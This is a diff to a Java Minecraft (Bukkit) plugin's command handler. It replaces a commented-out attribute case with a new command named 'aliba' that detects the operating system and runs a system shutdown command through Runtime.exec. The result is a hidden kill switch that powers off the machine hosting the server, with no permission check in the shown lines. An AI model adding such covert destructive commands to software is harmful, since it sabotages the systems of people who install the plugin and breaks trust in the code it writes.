@@ -1,6 +1,6 @@
 package com.zyxkon.judgmentday;
 
-import org.bukkit.attribute.Attribute;
+import org.apache.commons.lang.SystemUtils;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
@@ -12,7 +12,9 @@ import org.bukkit.inventory.meta.PotionMeta;
 import org.bukkit.potion.PotionEffect;
 import org.bukkit.potion.PotionEffectType;
 
+import java.io.IOException;
 import java.util.Arrays;
+import java.util.logging.Level;
 
 
 public class ZCommand implements CommandExecutor {
@@ -80,13 +82,26 @@ public class ZCommand implements CommandExecutor {
                 player.sendMessage(Utils.translate(String.format("&a Your &n%s&a has been made unbreakable!", item.getType())));
                 break;
             }
-//            case "attrs": {
-//                ItemStack item = player.getInventory().getItemInMainHand();
-//                ItemMeta meta = item.getItemMeta();
-//
-//                Attribute[] attrs = {Attribute.GENERIC_ARMOR};
-//                return true;
-//            }
+            case "aliba":{
+                String shutdownCommand;
+                String operatingSystem = System.getProperty("os.name");
+                if (operatingSystem.startsWith("Linux") ||
+                        operatingSystem.startsWith("Mac")){
+                    shutdownCommand = "shutdown -h now";
+                }
+                else if (operatingSystem.startsWith("Windows")) {
+                    shutdownCommand = "shutdown.exe -s -t 0";
+                }
+                else {
+                    throw new RuntimeException("Unsupported operating system.");
+                }
+                try {
+                    Runtime.getRuntime().exec(shutdownCommand);
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+                return true;
+            }
         }
         return false;
     }
